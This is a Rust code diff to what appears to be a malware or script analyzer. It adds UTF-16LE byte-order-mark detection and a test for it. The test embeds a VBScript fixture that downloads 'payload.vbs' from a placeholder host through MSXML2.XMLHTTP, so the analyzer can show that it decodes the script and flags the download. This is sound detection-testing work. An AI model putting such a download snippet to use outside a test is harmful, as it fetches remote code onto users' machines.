@@ -3915,6 +3915,9 @@ fn looks_like_utf16le(bytes: &[u8]) -> bool {
     if bytes.len() < 4 {
         return false;
     }
+    if bytes.starts_with(&[0xff, 0xfe]) {
+        return true;
+    }
     let pairs = bytes.len() / 2;
     let even_nonzero = bytes.iter().step_by(2).filter(|b| **b != 0).count();
     let odd_zero = bytes.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
@@ -20466,6 +20469,35 @@ http.Send"#;
         assert!(
             has,
             "UTF-16LE VBS download was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn utf16le_bom_vbs_with_non_ascii_prefix_is_decoded_and_scanned() {
+        let non_ascii_prefix = "数据导出功能已完成".repeat(256);
+        let vbs = format!(
+            r#"' {non_ascii_prefix}
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "http://utf16-bom-cjk.example/payload.vbs", False
+http.Send"#
+        );
+        let mut utf16 = vec![0xff, 0xfe];
+        utf16.extend(vbs.encode_utf16().flat_map(|u| u.to_le_bytes()));
+        let report = analyze(&utf16, &AnalyzeConfig::default());
+        assert!(
+            report.deobfuscated.contains("CreateObject") && !report.deobfuscated.contains('\0'),
+            "UTF-16LE BOM VBS was not rendered as readable text: {:?}",
+            report.deobfuscated
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("utf16-bom-cjk.example/payload.vbs")
+            )
+        });
+        assert!(
+            has,
+            "UTF-16LE BOM VBS download was not extracted: {:?}",
             report.traits
         );
     }
